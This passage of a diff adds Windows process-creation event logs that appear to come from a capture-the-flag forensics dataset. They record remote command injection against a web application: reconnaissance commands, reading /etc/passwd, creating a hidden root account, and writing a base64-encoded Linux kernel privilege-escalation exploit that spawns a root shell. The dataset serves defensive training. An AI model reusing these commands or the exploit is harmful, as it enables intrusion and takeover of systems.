4EH/AAj+kP8Af0rT2+tsh/pRcAHhnQj/AMwXTP8AwFj/AMKLsBT4W8PnGdD0o/W0j/wouAq+FvD6Z2aFpS564tIxn9KAGN4X8Pk/NoWlH62cf+FIAXwr4eHTQtK/8A4/8KLAMm8I+GpgRL4e0dwRghrKM5/8doAjPgHwkUBHhfQv/BfF/wDE07gVm8C+E+n/AAjOij6WMX/xNFwIj4B8Inr4Z0b/AMA4/wDClcBF+H/hBHR18NaQHUhlItE4I79KANRdD01Lh50soBK6hWYL1A6A1Nkae0n3GP4f0qRHR9PtmSQYdSgIYehH4UlCK2QOrN7spR+C/DEJzD4c0VDnOVsYgf8A0GqINi3tYrWMJbQxxRj+FFCgflQAjg7uTQAzHWgBmPekO4h5oAYaAG0DPnj9rf8A5lT/ALe//aNNEs+qLY/LVCJxQApoAhnxtzQBVzQBJC+1xQBac/IT7UgKue9MBM+1AEsDYcUgJ5uUz6UAVjQAhOKAETJPA60wLeSy/dGfY0gKtwCr80ANQ4oAehxnNAD9y4AoAQsCfwoAYSaAAGgAoAsFtsI9cUAUz1oAQDJAoAmWAlck80gIWXDEUDIieaAFoAQRs/TI+lAD2g2xcHmgCqyEdeaAGbcUARsKAGN9KQxmcnGKBnzx+1v/AMyp/wBvf/tGmiWfU1sflNUIsA0gA0AQ3HamBXxQAq9eKALvVMH0pAVG44NACYoAlgGXHtQBb6jFAETRjPFADZYxt+lAEA4HBpgTRoCCSwU+9ICOVfmIzn3FACRpuOB1oAlEJoAPKNACNGVGaAIyKABRk4oAk8o0AJPwFHtQBXNAwU4YH0NIRdVsqCKAKlwcucUDIMnPSgC3HGABnk0AS/hQA08igCrPGGB28GgDPZsdaAG5BoAaxoGRkikM+d/2tj/yKv8A29/+0aaJZ//ZCk15IE15ISBZb3UgYXJlIHZlcnkgY3VyaW91cyBwZXJzb24gYXJlbid0IHlvdS4gWW91IGFyZSBiYWQgcGVyc29uLiBObyBvbmUgbGlrZXMgYSBub3NleSBwZXJzb24uLiBleGNlcHQgZm9yIHVzISBJZiB0aGlzIGlzIGEgQk9UUyBhdCAuY29uZjE4IHBlcnNvbi4uLiBjb25ncmF0cyEgUmFpc2UgeW91ciBoYW5kIGFuZCB0ZWxsIHRoZSBwcm9jdG9ycyEgWW91IGp1c3Qgd29uIGEgdmVyeSBuaWNlIHByaXplLiBJZiB5b3VhcmUgYXQgYSByZWd1bGFyIEJPVFMuIFNPIFNPUlJZLi4gS2luZCBvZj4gVGVsbCB5b3VyIHByb2N0b3IgYW5kIHNlZSBpZiB0aGVyZSBpcyBhbnl0aGluZyBmb3IgeW91ICNibGFtZWJyb2Rza3kuIElmIHlvdSBhcmUgc2FkIHRoaXMgcGhvdG8gaXMgYmFkLCBzb3JyeS4gRnlvZG9yIGJhZCBhdCBwaG90b3MuIEl0IGlzIHBvdGF0byBwaG9uZQo= >> /tmp/definitelydontinvestigatethisfile.sh""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:08:36.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1748
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""echo LyoKICogVWJ1bnR1IDE2LjA0LjQga2VybmVsIHByaXYgZXNjCiAqCiAqIGFsbCBjcmVkaXRzIHRvIEBibGVpZGwKICogLSB2bmlrCiAqLwoKLy8gVGVzdGVkIG9uOgovLyA0LjQuMC0xMTYtZ2VuZXJpYyAjMTQwLVVidW50dSBTTVAgTW9uIEZlYiAxMiAyMToyMzowNCBVVEMgMjAxOCB4ODZfNjQKLy8gaWYgZGlmZmVyZW50IGtlcm5lbCBhZGp1c3QgQ1JFRCBvZmZzZXQgKyBjaGVjayBrZXJuZWwgc3RhY2sgc2l6ZQojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxlcnJuby5oPgojaW5jbHVkZSA8ZmNudGwuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8bGludXgvYnBmLmg+CiNpbmNsdWRlIDxsaW51eC91bmlzdGQuaD4KI2luY2x1ZGUgPHN5cy9tbWFuLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4KI2luY2x1ZGUgPHN5cy91bi5oPgojaW5jbHVkZSA8c3lzL3N0YXQuaD4KI2luY2x1ZGUgPHN0ZGludC5oPgoKI2RlZmluZSBQSFlTX09GRlNFVCAweGZmZmY4ODAwMDAwMDAwMDAKI2RlZmluZSBDUkVEX09GRlNFVCAweDVmOAojZGVmaW5lIFVJRF9PRkZTRVQgNAojZGVmaW5lIExPR19CVUZfU0laRSA2NTUzNgojZGVmaW5lIFBST0dTSVpFIDMyOAoKaW50IHNvY2tldHNbMl07CmludCBtYXBmZCwgcHJvZ2ZkOwoKY2hhciAqX19wcm9nID0gCSJceGI0XHgwOVx4MDBceDAwXHhmZlx4ZmZceGZmXHhmZiIKCQkiXHg1NVx4MDlceDAyXHgwMFx4ZmZceGZmXHhmZlx4ZmYiCgkJIlx4YjdceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceDk1XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHgxOFx4MTlceDAwXHgwMFx4MDNceDAwXHgwMFx4MDAiCgkJIlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceGJmXHg5MVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHhiZlx4YTJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4MDdceDAyXHgwMFx4MDBceGZjXHhmZlx4ZmZceGZmIgoJCSJceDYyXHgwYVx4ZmNceGZmXHgwMFx4MDBceDAwXHgwMCIKCQkiXHg4NVx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDAiCgkJIlx4NTVceDAwXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceDk1XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHg3OVx4MDZceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4YmZceDkxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceGJmXHhhMlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHgwN1x4MDJceDAwXHgwMFx4ZmNceGZmXHhmZlx4ZmYiCgkJIlx4NjJceDBhXHhmY1x4ZmZceDAxXHgwMFx4MDBceDAwIgoJCSJceDg1XHgwMFx4MDBceDAwXHgwMVx4MDBceDAwXHgwMCIKCQkiXHg1NVx4MDBceDAxXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4OTVceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceDc5XHgwN1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHhiZlx4OTFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4YmZceGEyXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceDA3XHgwMlx4MDBceDAwXHhmY1x4ZmZceGZmXHhmZiIKCQkiXHg2Mlx4MGFceGZjXHhmZlx4MDJceDAwXHgwMFx4MDAiCgkJIlx4ODVceDAwXHgwMFx4MDBceDAxXHgwMFx4MDBceDAwIgoJCSJceDU1XHgwMFx4MDFceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHg5NVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4NzlceDA4XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceGJmXHgwMlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHhiN1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4NTVceDA2XHgwM1x4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceDc5XHg3M1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHg3Ylx4MzJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4OTVceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceDU1XHgwNlx4MDJceDAwXHgwMVx4MDBceDAwXHgwMCIKCQkiXHg3Ylx4YTJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4OTVceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIgoJCSJceDdiXHg4N1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIKCQkiXHg5NVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiOwoKY2hhciBicGZfbG9nX2J1ZltMT0dfQlVGX1NJWkVdOwoKc3RhdGljIGludCBicGZfcHJvZ19sb2FkKGVudW0gYnBmX3Byb2dfdHlwZSBwcm9nX3R5cGUsCgkJICBjb25zdCBzdHJ1Y3QgYnBmX2luc24gKmluc25zLCBpbnQgcHJvZ19sZW4sCgkJICBjb25zdCBjaGFyICpsaWNlbnNlLCBpbnQga2Vybl92ZXJzaW9uKSB7Cgl1bmlvbiBicGZfYXR0ciBhdHRyID0gewoJCS5wcm9nX3R5cGUgPSBwcm9nX3R5cGUsCgkJLmluc25zID0gKF9fdTY0KWluc25zLAoJCS5pbnNuX2NudCA9IHByb2dfbGVuIC8gc2l6ZW9mKHN0cnVjdCBicGZfaW5zbiksCgkJLmxpY2Vuc2UgPSAoX191NjQpbGljZW5zZSwKCQkubG9nX2J1ZiA9IChfX3U2NClicGZfbG9nX2J1ZiwKCQkubG9nX3NpemUgPSBMT0dfQlVGX1NJWkUsCgkJLmxvZ19sZXZlbCA9IDEsCgl9OwoKCWF0dHIua2Vybl92ZXJzaW9uID0ga2Vybl92ZXJzaW9uOwoKCWJwZl9sb2dfYnVmWzBdID0gMDsKCglyZXR1cm4gc3lzY2FsbChfX05SX2JwZiwgQlBGX1BST0dfTE9BRCwgJmF0dHIsIHNpemVvZihhdHRyKSk7Cn0KCnN0YXRpYyBpbnQgYnBmX2NyZWF0ZV9tYXAoZW51bSBicGZfbWFwX3R5cGUgbWFwX3R5cGUsIGludCBrZXlfc2l6ZSwgaW50IHZhbHVlX3NpemUsCgkJICAgaW50IG1heF9lbnRyaWVzKSB7Cgl1bmlvbiBicGZfYXR0ciBhdHRyID0gewoJCS5tYXBfdHlwZSA9IG1hcF90eXBlLAoJCS5rZXlfc2l6ZSA9IGtleV9zaXplLAoJCS52YWx1ZV9zaXplID0gdmFsdWVfc2l6ZSwKCQkubWF4X2VudHJpZXMgPSBtYXhfZW50cmllcwoJfTsKCglyZXR1cm4gc3lzY2FsbChfX05SX2JwZiwgQlBGX01BUF9DUkVBVEUsICZhdHRyLCBzaXplb2YoYXR0cikpOwp9CgpzdGF0aWMgaW50IGJwZl91cGRhdGVfZWxlbSh1aW50NjRfdCBrZXksIHVpbnQ2NF90IHZhbHVlKSB7Cgl1bmlvbiBicGZfYXR0ciBhdHRyID0gewoJCS5tYXBfZmQgPSBtYXBmZCwKCQkua2V5ID0gKF9fdTY0KSZrZXksCgkJLnZhbHVlID0gKF9fdTY0KSZ2YWx1ZSwKCQkuZmxhZ3MgPSAwLAoJfTsKCglyZXR1cm4gc3lzY2FsbChfX05SX2JwZiwgQlBGX01BUF9VUERBVEVfRUxFTSwgJmF0dHIsIHNpemVvZihhdHRyKSk7Cn0KCnN0YXRpYyBpbnQgYnBmX2xvb2t1cF9lbGVtKHZvaWQgKmtleSwgdm9pZCAqdmFsdWUpIHsKCXVuaW9uIGJwZl9hdHRyIGF0dHIgPSB7CgkJLm1hcF9mZCA9IG1hcGZkLAoJCS5rZXkgPSAoX191NjQpa2V5LAoJCS52YWx1ZSA9IChfX3U2NCl2YWx1ZSwKCX07CgoJcmV0dXJuIHN5c2NhbGwoX19OUl9icGYsIEJQRl9NQVBfTE9PS1VQX0VMRU0sICZhdHRyLCBzaXplb2YoYXR0cikpOwp9CgpzdGF0aWMgdm9pZCBfX2V4aXQoY2hhciAqZXJyKSB7CglmcHJpbnRmKHN0ZGVyciwgImVycm9yOiAlc1xuIiwgZXJyKTsKCWV4aXQoLTEpOwp9CgpzdGF0aWMgdm9pZCBwcmVwKHZvaWQpIHsKCW1hcGZkID0gYnBmX2NyZWF0ZV9tYXAoQlBGX01BUF9UWVBFX0FSUkFZLCBzaXplb2YoaW50KSwgc2l6ZW9mKGxvbmcgbG9uZyksIDMpOwoJaWYgKG1hcGZkIDwgMCkKCQlfX2V4aXQoc3RyZXJyb3IoZXJybm8pKTsKCglwcm9nZmQgPSBicGZfcHJvZ19sb2FkKEJQRl9QUk9HX1RZUEVfU09DS0VUX0ZJTFRFUiwKCQkJKHN0cnVjdCBicGZfaW5zbiAqKV9fcHJvZywgUFJPR1NJWkUsICJHUEwiLCAwKTsKCglpZiAocHJvZ2ZkIDwgMCkKCQlfX2V4aXQoc3RyZXJyb3IoZXJybm8pKTsKCglpZihzb2NrZXRwYWlyKEFGX1VOSVgsIFNPQ0tfREdSQU0sIDAsIHNvY2tldHMpKQoJCV9fZXhpdChzdHJlcnJvcihlcnJubykpOwoKCWlmKHNldHNvY2tvcHQoc29ja2V0c1sxXSwgU09MX1NPQ0tFVCwgU09fQVRUQUNIX0JQRiwgJnByb2dmZCwgc2l6ZW9mKHByb2dmZCkpIDwgMCkKCQlfX2V4aXQoc3RyZXJyb3IoZXJybm8pKTsKfQoKc3RhdGljIHZvaWQgd3JpdGVtc2codm9pZCkgewoJY2hhciBidWZmZXJbNjRdOwoKCXNzaXplX3QgbiA9IHdyaXRlKHNvY2tldHNbMF0sIGJ1ZmZlciwgc2l6ZW9mKGJ1ZmZlcikpOwoKCWlmIChuIDwgMCkgewoJCXBlcnJvcigid3JpdGUiKTsKCQlyZXR1cm47Cgl9CglpZiAobiAhPSBzaXplb2YoYnVmZmVyKSkKCQlmcHJpbnRmKHN0ZGVyciwgInNob3J0IHdyaXRlOiAlbHVcbiIsIG4pOwp9CgojZGVmaW5lIF9fdXBkYXRlX2VsZW0oYSwgYiwgYykgXAoJYnBmX3VwZGF0ZV9lbGVtKDAsIChhKSk7IFwKCWJwZl91cGRhdGVfZWxlbSgxLCAoYikpOyBcCglicGZfdXBkYXRlX2VsZW0oMiwgKGMpKTsgXAoJd3JpdGVtc2coKTsKCnN0YXRpYyB1aW50NjRfdCBnZXRfdmFsdWUoaW50IGtleSkgewoJdWludDY0X3QgdmFsdWU7CgoJaWYgKGJwZl9sb29rdXBfZWxlbSgma2V5LCAmdmFsdWUpKQoJCV9fZXhpdChzdHJlcnJvcihlcnJubykpOwoKCXJldHVybiB2YWx1ZTsKfQoKc3RhdGljIHVpbnQ2NF90IF9fZ2V0X2ZwKHZvaWQpIHsKCV9fdXBkYXRlX2VsZW0oMSwgMCwgMCk7CgoJcmV0dXJuIGdldF92YWx1ZSgyKTsKfQoKc3RhdGljIHVpbnQ2NF90IF9fcmVhZCh1aW50NjRfdCBhZGRyKSB7CglfX3VwZGF0ZV9lbGVtKDAsIGFkZHIsIDApOwoKCXJldHVybiBnZXRfdmFsdWUoMik7Cn0KCnN0YXRpYyB2b2lkIF9fd3JpdGUodWludDY0X3QgYWRkciwgdWludDY0X3QgdmFsKSB7CglfX3VwZGF0ZV9lbGVtKDIsIGFkZHIsIHZhbCk7Cn0KCnN0YXRpYyB1aW50NjRfdCBnZXRfc3AodWludDY0X3QgYWRkcikgewoJcmV0dXJuIGFkZHIgJiB+KDB4NDAwMCAtIDEpOwp9CgpzdGF0aWMgdm9pZCBwd24odm9pZCkgewoJdWludDY0X3QgZnAsIHNwLCB0YXNrX3N0cnVjdCwgY3JlZHB0ciwgdWlkcHRyOwoKCWZwID0gX19nZXRfZnAoKTsKCWlmIChmcCA8IFBIWVNfT0ZGU0VUKQoJCV9fZXhpdCgiYm9ndXMgZnAiKTsKCQoJc3AgPSBnZXRfc3AoZnApOwoJaWYgKHNwIDwgUEhZU19PRkZTRVQpCgkJX19leGl0KCJib2d1cyBzcCIpOwoJCgl0YXNrX3N0cnVjdCA9IF9fcmVhZChzcCk7CgoJaWYgKHRhc2tfc3RydWN0IDwgUEhZU19PRkZTRVQpCgkJX19leGl0KCJib2d1cyB0YXNrIHB0ciIpOwoKCXByaW50ZigidGFza19zdHJ1Y3QgPSAlbHhcbiIsIHRhc2tfc3RydWN0KTsKCgljcmVkcHRyID0gX19yZWFkKHRhc2tfc3RydWN0ICsgQ1JFRF9PRkZTRVQpOyAvLyBjcmVkCgoJaWYgKGNyZWRwdHIgPCBQSFlTX09GRlNFVCkKCQlfX2V4aXQoImJvZ3VzIGNyZWQgcHRyIik7CgoJdWlkcHRyID0gY3JlZHB0ciArIFVJRF9PRkZTRVQ7IC8vIHVpZAoJaWYgKHVpZHB0ciA8IFBIWVNfT0ZGU0VUKQoJCV9fZXhpdCgiYm9ndXMgdWlkIHB0ciIpOwoKCXByaW50ZigidWlkcHRyID0gJWx4XG4iLCB1aWRwdHIpOwoJX193cml0ZSh1aWRwdHIsIDApOyAvLyBzZXQgYm90aCB1aWQgYW5kIGdpZCB0byAwCgoJaWYgKGdldHVpZCgpID09IDApIHsKCQlwcmludGYoInNwYXduaW5nIHJvb3Qgc2hlbGxcbiIpOwoJCXN5c3RlbSgiL2Jpbi9iYXNoIik7CgkJZXhpdCgwKTsKCX0KCglfX2V4aXQoIm5vdCB2dWxuZXJhYmxlPyIpOwp9CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKCXByZXAoKTsKCXB3bigpOwoKCXJldHVybiAwOwp9 >> /tmp/colonel""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:07:46.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xf70
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""lsb_release -a""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:07:27.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x18d0
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""uname -a""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:07:03.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x294
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""useradd -ou 0 -g 0 -M -N -r -s /bin/bash  tomcat7 -p davidverve.com""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:06:38.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x2a3c
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action ""cat /etc/passwd""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:06:20.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x2a48
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action groups
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:06:01.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1ae4
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action id
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T12:05:40.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xa6c
+	New Process Name:	C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\unziped\lsof-master\iexeplorer.exe"" http://192.168.9.30:8080/frothlyinventory/showcase.action whoami
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
